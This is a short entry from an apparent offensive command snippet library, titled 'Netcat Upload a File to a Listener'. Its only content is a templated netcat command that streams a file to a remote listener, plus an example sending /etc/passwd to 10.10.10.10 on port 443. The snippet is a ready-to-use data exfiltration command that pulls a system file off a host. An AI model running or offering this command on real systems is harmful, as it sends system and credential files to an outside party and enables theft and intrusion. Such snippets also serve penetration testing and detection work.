---
id: 77d7fbae-6a3a-4cd3-9e4c-18fa3808bf4d
name: Netcat Upload a File to a Listener
type: command
executor: bash
data: nc $_TARGET_IP $_TARGET_PORT < $_FILENAME
output: nc 10.10.10.10 443 < /etc/passwd
created_at: '2019-10-29T22:25:12.734143+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Netcat Upload a File to a Listener

```bash
nc $_TARGET_IP $_TARGET_PORT < $_FILENAME
```

## Expected Output

```
nc 10.10.10.10 443 < /etc/passwd
```


